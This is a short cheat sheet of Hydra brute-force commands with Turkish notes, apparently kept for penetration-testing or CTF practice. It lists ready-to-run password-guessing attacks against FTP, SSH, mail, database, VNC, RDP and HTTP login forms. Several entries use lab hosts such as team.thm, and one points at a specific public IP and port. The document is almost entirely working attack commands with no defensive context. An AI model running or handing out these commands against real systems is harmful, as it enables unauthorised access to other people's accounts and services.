## hydra services examples:

+ **ftp**: `hydra -l admin -P /path/to/password_list.txt ftp://192.168.1.100`
+ **ssh**: `hydra -l root -P /path/to/password_list.txt ssh://192.168.1.100`
+ **http-get/post** `hydra -l admin -P /path/to/password_list.txt http://192.168.1.100 http-post-form "/login.php:user=^USER^&pass=^PASS^:F=incorrect"`
+ **smtp** `hydra -l admin -P /path/to/password_list.txt smtp://mail.server.com`
+ **pop3** `hydra -l user@example.com -P /path/to/password_list.txt pop3://mail.server.com`
+ **imap** `hydra -l user@example.com -P /path/to/password_list.txt imap://mail.server.com`
+ **mysql** `hydra -l root -P /path/to/password_list.txt mysql://192.168.1.100`
+ **mssql** `hydra -l sa -P /path/to/password_list.txt mssql://192.168.1.100`
+ **vnc** `hydra -P /path/to/password_list.txt vnc://192.168.1.100`
+ **rdp** `hydra -l admin -P /path/to/password_list.txt rdp://192.168.1.100`
+ **Advanced RDP Brute-Forcing** `hydra -l administrator -x 6:8:abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 192.168.1.100 rdp`


*** Login için BruteForce ***
```bash
hydra -L users.txt -P passwords.txt <HEDEF_IP> http-post-form "/login.php:username=^USER^&password=^PASS^:F=Hatalı Giriş" -V
```
http-get bruteforce
```bash
hydra -l admin -P '/wordlists/rockyou.txt' 10.10.222.132 http-get /inferno -s 80 -I
```
*** ssh için dale ismi ile bruteforce ***

``` bash
hydra -l dale -P /usr/share/wordlists/rockyou.txt  ssh://team.thm
```
veya

``` bash
hydra -l dale -P /usr/share/wordlists/rockyou.txt  ssh://10.10.10.10
```


``` bash
hydra -C file ssh//10.10.1.1 -T4 
```

**brute force web login form**

```bash
# S=success F='Invalid credentials'
hydra -l admin -P passwords.txt www.example.com http-post-form "/login:user=^USER^&pass=^PASS^:S=302"
```
**responsede Invalid Credentials gördüğü sürece devam eder**
```bash
hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/seclists/Passwords/2023-200_most_used_passwords.txt -f 154.57.164.77 -s 42219  http-post-form "/:username=^USER^&password=^PASS^:F=Invalid credentials"

```



